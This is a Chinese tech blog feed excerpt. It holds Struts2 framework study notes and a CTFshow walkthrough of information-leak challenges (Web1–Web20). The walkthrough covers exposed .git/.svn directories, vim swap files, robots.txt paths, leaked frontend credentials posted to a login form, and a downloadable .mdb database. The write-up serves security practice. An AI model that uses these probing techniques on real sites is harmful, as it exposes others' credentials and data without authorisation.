class="keyword">public</span> String <span class="title">getPassWord</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> PassWord;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassWord</span><span class="params">(String passWord)</span> </span>&#123;</span><br><span class="line">PassWord = passWord;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  2.直接使用域对象字段驱动方式的数据传递</p><h3 id="模型驱动"><a href="#模型驱动" class="headerlink" title="模型驱动"></a>模型驱动</h3><p>模型驱动，通过实现ModelDriven接口来接受请求参数，Action类必须实现接口，并且要重写getModel()方法，这个方法返回的就是Action所使用的数据模型对象。</p><h2 id="Result结果类型"><a href="#Result结果类型" class="headerlink" title="Result结果类型"></a>Result结果类型</h2><h3 id="配置-Result"><a href="#配置-Result" class="headerlink" title="配置 Result"></a>配置 Result</h3><p>result标签的属性：</p><ul><li>name属性：指定逻辑视图的名称，默认为success。</li><li>type 属性：指定返回的视图资源的类型，不同的类型代表不同的结果输出，默认值是dispatcher。</li></ul><p>struts.xml文件中<code>&lt;result&gt;</code>元素配置代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loginAction&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;loaction&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述配置，使用了<code>&lt;result&gt;</code>元素的name、type属性和param子元素。</p><p><code>&lt;param&gt;</code>子元素的name属性有两个值,分别如下:<br>| 属性     | 描述                                                         |<br>| ——– | ———————————————————— |<br>| location | 指定该逻辑视图所对应的实际视图资源。                         |<br>| parse    | 指定在逻辑视图资源名称中是否可以使用OGNL表达式。默认值为true,表示可以使用，如果设为false,则表示不支持。 |</p><p>上面的配置可以简化为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loginAction&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="预定义的结果类型"><a href="#预定义的结果类型" class="headerlink" title="预定义的结果类型"></a>预定义的结果类型</h3><table><thead><tr><th>属性</th><th>说明</th><th>对应类</th></tr></thead><tbody><tr><td>chain</td><td>用来处理Action 链</td><td>com.opensymphony.xwork2.ActionChainResult</td></tr><tr><td>dispatcher</td><td>用来转向页面，通常处理 JSP</td><td>org.apache.struts2.dispatcher.ServletDispatcherResult</td></tr><tr><td>redirect</td><td>重定向到一个URL</td><td>org.apache.struts2.dispatcher.ServletRedirectResult</td></tr><tr><td>redirectAction</td><td>重定向到一个 Action</td><td>org.apache.struts2.dispatcher.ServletActionRedirectResult</td></tr><tr><td>plainText</td><td>显示源文件内容，如文件源码</td><td>org.apache.struts2.dispatcher.PlainTextResult</td></tr><tr><td>freemarker</td><td>处理 FreeMarker 模板</td><td>org.apache.struts2.views.freemarker.FreemarkerResult</td></tr><tr><td>httpheader</td><td>控制特殊 http 行为的结果类型</td><td>org.apache.struts2.dispatcher.HttpHeaderResult</td></tr><tr><td>stream</td><td>向浏览器发送 InputSream 对象，通常用来处理文件下载，还可用于返回 AJAX 数据。</td><td>org.apache.struts2.dispatcher.StreamResult</td></tr><tr><td>velocity</td><td>处理 Velocity 模板</td><td>org.apache.struts2.dispatcher.VelocityResult</td></tr><tr><td>xslt</td><td>处理 XML/XLST 模板</td><td>org.apache.struts2.views.xslt.XSLTResult</td></tr></tbody></table><p>表中例举了Struts2中预定义的全部11种结果类型，其中dispatcher是默认的结果类型，主要用来与JSP整合。其中，dispatcher和redirect是比较常用到的结果集。</p><h3 id="dispatcher结果类型"><a href="#dispatcher结果类型" class="headerlink" title="dispatcher结果类型"></a>dispatcher结果类型</h3><p>dispatcher结果类型用来表示“转发”到指定结果资源，它是struts2默认的结果类型。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>  <span class="attr">type</span>=<span class="string">&quot;dispatcher&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;location&quot;</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;parse&quot;</span> &gt;</span>true<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码中，location参数用于指定Action执行完毕后要转向的目标资源；parse参数是一个布尔型的值，默认是true，表示解析location参数中的OGNL表达式。</p><h3 id="redirect结果类型"><a href="#redirect结果类型" class="headerlink" title="redirect结果类型"></a>redirect结果类型</h3><p>redirect结果类型用来重定向到新的结果资源，该资源可以是JSP文件，也可以是Action文件。</p><p>对本文上面<code>通过ActionContext类访问Servlet API</code>标题下面的struts.xml代码进行更改：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;dispatcher&quot;</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户名和密码正确，使用redirect重新定向到success.jsp；用户名和密码错误，使用的是dispatcher的结果类型，跳转到error.jsp。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（二）&lt;/p&gt;</summary>
    
    
    
    <category term="SSH" scheme="https://swhat.github.io/categories/SSH/"/>
    
    
    <category term="Struts2" scheme="https://swhat.github.io/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-Web入门-信息泄露</title>
    <link href="https://swhat.github.io/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>https://swhat.github.io/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2021-03-26T14:28:01.000Z</published>
    <updated>2021-04-04T14:02:37.271Z</updated>
    
    <content type="html"><![CDATA[<p>CTFshow靶场 Web入门系列</p> <a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><h3 id="考点-源码泄露"><a href="#考点-源码泄露" class="headerlink" title="考点: 源码泄露"></a>考点: 源码泄露</h3><blockquote><p>题目描述：开发注释未及时删除</p></blockquote><p>查看源代码，得到flag</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="考点-前台JS绕过"><a href="#考点-前台JS绕过" class="headerlink" title="考点: 前台JS绕过"></a>考点: 前台JS绕过</h3><blockquote><p>题目描述:js前台拦截 === 无效操作</p></blockquote><p>查看源码方法很多<br>1.禁用JS,再查看源代码；<br>2.在网址前加上<code>view-source:</code>即可查看源代码<br>3.ctrl+u查看源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;  </span><br><span class="line"><span class="comment">//禁用鼠标右键</span></span><br><span class="line"><span class="built_in">window</span>.onselectstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</span><br><span class="line"><span class="comment">//禁用页面选择</span></span><br><span class="line"><span class="built_in">window</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">if</span> (event.keyCode==<span class="number">123</span>)&#123;event.keyCode=<span class="number">0</span>;event.returnValue=<span class="literal">false</span>;&#125;&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">   <span class="comment">//禁用F12键</span></span><br></pre></td></tr></table></figure><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><h3 id="考点-协议头信息泄露"><a href="#考点-协议头信息泄露" class="headerlink" title="考点: 协议头信息泄露"></a>考点: 协议头信息泄露</h3><blockquote><p>题目描述：没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>抓包，查看响应头，即可得到flag</p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><h3 id="考点-robots后台泄露"><a href="#考点-robots后台泄露" class="headerlink" title="考点: robots后台泄露"></a>考点: robots后台泄露</h3><blockquote><p>题目描述：总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>访问robots.txt，得到flagishere.txt信息，访问即可</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><h3 id="考点-phps源码泄露"><a href="#考点-phps源码泄露" class="headerlink" title="考点: phps源码泄露"></a>考点: phps源码泄露</h3><blockquote><p>题目描述：phps源码泄露有时候能帮上忙</p></blockquote><p>访问index.phps下载备份文件</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><h3 id="考点-源码压缩包泄露"><a href="#考点-源码压缩包泄露" class="headerlink" title="考点: 源码压缩包泄露"></a>考点: 源码压缩包泄露</h3><blockquote><p>题目描述：解压源码到当前目录，测试正常，收工</p></blockquote><p>访问<a href="http://www.zip下载源码,解压得到fl000g.txt,里面的是假flag,需要访问才会得到真flag/">www.zip下载源码，解压得到fl000g.txt，里面的是假flag，需要访问才会得到真flag</a></p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><h3 id="考点-Git泄露"><a href="#考点-Git泄露" class="headerlink" title="考点: Git泄露"></a>考点: Git泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问目录url/.git/</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><h3 id="考点-SVN泄露"><a href="#考点-SVN泄露" class="headerlink" title="考点: SVN泄露"></a>考点: SVN泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问url/.svn即可</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><h3 id="考点-vim临时文件泄露"><a href="#考点-vim临时文件泄露" class="headerlink" title="考点: vim临时文件泄露"></a>考点: vim临时文件泄露</h3><blockquote><p>题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>提示在使用vim时意外退出，会在目录下生成一个备份文件，格式为 .文件名.swp，访问url/index.php.swp下载备份文件</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><h3 id="考点-cookie泄露"><a href="#考点-cookie泄露" class="headerlink" title="考点: cookie泄露"></a>考点: cookie泄露</h3><blockquote><p>题目描述：cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>抓包查看cookie发现flag</p><h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><h3 id="考点-域名txt记录泄露"><a href="#考点-域名txt记录泄露" class="headerlink" title="考点: 域名txt记录泄露"></a>考点: 域名txt记录泄露</h3><blockquote><p>题目描述：域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</p></blockquote><p>在线DNS域名解析，即可得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://whois.chinaz.com/</span><br><span class="line">http://www.jsons.cn/nslookup/</span><br><span class="line">https://zijian.aliyun.com/</span><br></pre></td></tr></table></figure><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><h3 id="考点-敏感信息公布"><a href="#考点-敏感信息公布" class="headerlink" title="考点: 敏感信息公布"></a>考点: 敏感信息公布</h3><blockquote><p>题目描述：有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问后台地址admin，管理员账号admin，在网页底找到了电话号码，猜测是密码</p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><h3 id="考点-内部技术文档泄露"><a href="#考点-内部技术文档泄露" class="headerlink" title="考点: 内部技术文档泄露"></a>考点: 内部技术文档泄露</h3><blockquote><p>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>在网页底部找到一个doucument链接。得到后台地址<code>/system1103/login.php</code>和帐号密码</p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><h3 id="考点-编辑器配置不当"><a href="#考点-编辑器配置不当" class="headerlink" title="考点: 编辑器配置不当"></a>考点: 编辑器配置不当</h3><blockquote><p>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问url/editor，发现一个网页自带的编辑器,点击上传图片，可以看到文件目录，/var/www/html/nothinghere 中有一个fl000g.txt，访问<code>/nothinghere/fl000g.txt</code>即可得到flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><h3 id="考点-密码逻辑脆弱"><a href="#考点-密码逻辑脆弱" class="headerlink" title="考点: 密码逻辑脆弱"></a>考点: 密码逻辑脆弱</h3><blockquote><p>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>在底部找到邮箱信息，访问后台地址/admin，用户名admin ，选择忘记密码。查找到邮箱qq所在地为西安，返回修改后的密码，登录即可得到flag。</p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><h3 id="考点-探针泄露"><a href="#考点-探针泄露" class="headerlink" title="考点: 探针泄露"></a>考点: 探针泄露</h3><blockquote><p>题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问/tz.php，看下PHP参数,点击phpinfo超链接，在phpinfo页面搜索ctfshow即可</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><h3 id="考点-CDN穿透"><a href="#考点-CDN穿透" class="headerlink" title="考点: CDN穿透"></a>考点: CDN穿透</h3><blockquote><p>题目描述：透过重重缓存，查找到ctfer.com的真实IP，提交 flag{IP地址}</p></blockquote><p>根据hint提示，直接ping <a href="http://www.ctfshow.com得到ip地址111.231.70.44/">www.ctfshow.com得到IP地址111.231.70.44</a></p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><h3 id="考点-js敏感信息泄露"><a href="#考点-js敏感信息泄露" class="headerlink" title="考点: js敏感信息泄露"></a>考点: js敏感信息泄露</h3><blockquote><p>题目描述：不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>查看源码，发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/Flappy_js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问/js/Flappy_js.js查看Flappy_js.js文件，发现了一段编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="built_in">window</span>.confirm(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Unicode解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你赢了，去幺幺零点皮爱吃皮看看</span><br></pre></td></tr></table></figure><p>访问/110.php即可</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><h3 id="考点-前端密钥泄露"><a href="#考点-前端密钥泄露" class="headerlink" title="考点: 前端密钥泄露"></a>考点: 前端密钥泄露</h3><blockquote><p>题目描述：密钥什么的，就不要放在前端了</p></blockquote><p>查看源码，前端含有注释代码，泄露了用户名和密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    error_reporting(0);</span></span><br><span class="line"><span class="comment">    $flag=&quot;fakeflag&quot;</span></span><br><span class="line"><span class="comment">    $u = $_POST[&#x27;username&#x27;];</span></span><br><span class="line"><span class="comment">    $p = $_POST[&#x27;pazzword&#x27;];</span></span><br><span class="line"><span class="comment">    if(isset($u) &amp;&amp; isset($p))&#123;</span></span><br><span class="line"><span class="comment">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            echo $flag;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br></pre></td></tr></table></figure><p>输入用户名和密码提示不正确，用Post提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br></pre></td></tr></table></figure><h2 id="WEB-20"><a href="#WEB-20" class="headerlink" title="WEB 20"></a>WEB 20</h2><h3 id="考点-数据库恶意下载"><a href="#考点-数据库恶意下载" class="headerlink" title="考点: 数据库恶意下载"></a>考点: 数据库恶意下载</h3><blockquote><p>题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>早期asp+access架构的数据库文件为db.mdb，直接查看url路径添加加/db/db.mdb下载文件，用记事本打开搜索flag即可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTFshow靶场 Web入门系列&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFshow" scheme="https://swhat.github.io/tags/CTFshow/"/>
    
    <category term="信息泄露" scheme="https://swhat.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2框架入门</title>
    <link href="https://swhat.github.io/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
    <id>https://swhat.github.io/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</id>
    <published>2021-03-19T12:26:02.000Z</published>
    <updated>2021-04-03T14:10:48.348Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（一）</p> <a id="more"></a><h1 id="Struts2框架入门"><a href="#Struts2框架入门" class="headerlink" title="Struts2框架入门"></a>Struts2框架入门</h1><h2 id="Struts2简介"><a href="#Struts2简介" class="headerlink" title="Struts2简介"></a>Struts2简介</h2><blockquote><p>Struts2是一种基于MVC模式的轻量级Web框架，Struts2是Struts1的下一代产品，是在Struts1和WebWork技术的基础上进行合并后的全新框架</p></blockquote><p>struts2框架其实是对javaWeb表现层的MVC作了优化</p><h2 id="Struts2的优点"><a href="#Struts2的优点" class="headerlink" title="Struts2的优点"></a>Struts2的优点</h2><p>1、项目开源，使用及拓展方便，天生优势。<br>2、提供Exception处理机制。<br>3、Result方式的页面导航，通过Result标签实现页面跳转。4<br>4、通过简单、集中的配置来调度业务类，方便修改。<br>5、提供简单、统一的表达式语言来访问所有可供访问的数据。<br>6、提供标准、强大的验证框架和国际化框架。<br>7、提供强大的、可以有效减少页面代码的标签。<br>8、提供良好的Ajax支持。<br>9、拥有简单的插件，可以扩展Struts2框架。<br>10、拥有智能的默认设置，不需要另外进行繁琐的设置。</p><h2 id="Struts2入门案例"><a href="#Struts2入门案例" class="headerlink" title="Struts2入门案例"></a>Struts2入门案例</h2><h3 id="第一步：下载jar包"><a href="#第一步：下载jar包" class="headerlink" title="第一步：下载jar包"></a>第一步：下载jar包</h3><p>下载地址：<a href="https://struts.apache.org/">https://struts.apache.org/</a></p><p>选择struts-2.3.37-all.zip 下载<br><img src="https://img-blog.csdnimg.cn/20210318221037734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下载解压后，出现以下界面,struts-2.3.37的目录结构：<br><img src="https://img-blog.csdnimg.cn/20210318221245199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>由于struts的jar包并不全部需要，找到apps目录下struts2-blank.war</p><p><img src="https://img-blog.csdnimg.cn/20210318221723429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压struts2-blank.war，将示例程序lib目录下的jar包添加到我们项目中即可，此版本的Struts2项目必需的13个jar包。<br><img src="https://img-blog.csdnimg.cn/20210318221628262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第二步：创建项目导入jar包"><a href="#第二步：创建项目导入jar包" class="headerlink" title="第二步：创建项目导入jar包"></a>第二步：创建项目导入jar包</h3><p>创建项目，将上面的13个jar包粘贴到lib中，然后build path，会在Web App Libraries中看到<br><img src="https://img-blog.csdnimg.cn/20210319193907712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第三步：配置web-xml"><a href="#第三步：配置web-xml" class="headerlink" title="第三步：配置web.xml"></a>第三步：配置web.xml</h3><p>编辑web应用的web.xml配置文件，配置struts2的核心拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span></span><br><span class="line"><span class="tag"> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string"> http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> </span></span><br><span class="line"><span class="tag"> <span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>FirstStruts2<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.htm<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>default.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>default.htm<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>default.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置Struts2核心过滤器--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第四步：创建Action类"><a 